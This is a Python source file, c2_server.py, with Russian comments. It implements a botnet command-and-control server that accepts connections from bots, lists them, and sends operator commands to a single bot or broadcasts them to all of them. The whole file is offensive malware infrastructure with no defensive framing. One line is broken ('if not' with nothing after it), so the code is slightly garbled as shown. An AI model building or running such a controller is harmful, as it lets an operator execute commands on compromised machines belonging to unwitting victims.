# c2_server.py
import socket
import threading
import json
import time

# Храним подключённые боты
bots = []
bot_id_counter = 0

def handle_bot(conn, addr):
    global bot_id_counter
    bot_id = bot_id_counter
    bot_id_counter += 1
    bots.append({"id": bot_id, "conn": conn, "addr": addr})
    print(f"[+] Бот подключён: ID={bot_id}, IP={addr}")

    try:
        while True:
            data = conn.recv(4096)
            if not 
                break
            try:
                response = json.loads(data.decode())
                print(f"[Бот {bot_id}] Ответ: {response.get('result', 'нет данных')}")
            except json.JSONDecodeError:
                print(f"[Бот {bot_id}] Сырые данные: {data.decode()}")
    except Exception as e:
        print(f"[-] Бот {bot_id} отключён: {e}")
    finally:
        if conn in [b['conn'] for b in bots]:
            bots.remove(next(b for b in bots if b['conn'] == conn))
        conn.close()

def command_loop():
    while True:
        cmd = input("\nC2> ")
        if cmd.strip() == "":
            continue
        if cmd.lower() == "list":
            print("Подключённые боты:")
            for bot in bots:
                print(f"  ID: {bot['id']}, IP: {bot['addr']}")
        elif cmd.lower().startswith("send "):
            try:
                _, bot_id, *command = cmd.split()
                bot_id = int(bot_id)
                command = " ".join(command)
                target_bot = next((b for b in bots if b["id"] == bot_id), None)
                if target_bot:
                    target_bot["conn"].send(command.encode())
                    print(f"Команда отправлена боту {bot_id}")
                else:
                    print(f"Бот {bot_id} не найден")
            except:
                print("Использование: send <id> <команда>")
        elif cmd.lower() == "broadcast":
            msg = input("Команда для всех ботов: ")
            for bot in bots:
                try:
                    bot["conn"].send(msg.encode())
                except:
                    pass
            print(f"Команда отправлена {len(bots)} ботам")
        elif cmd.lower() == "exit":
            break
        else:
            print("Доступные команды: list, send <id> <cmd>, broadcast, exit")

def start_server():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind(('127.0.0.1', 8888))
    server.listen(5)
    print("C2 сервер запущен на 127.0.0.1:8888")

    threading.Thread(target=command_loop, daemon=True).start()

    try:
        while True:
            conn, addr = server.accept()
            threading.Thread(target=handle_bot, args=(conn, addr), daemon=True).start()
    except KeyboardInterrupt:
        print("\nСервер остановлен.")
        server.close()

if __name__ == "__main__":
    start_server()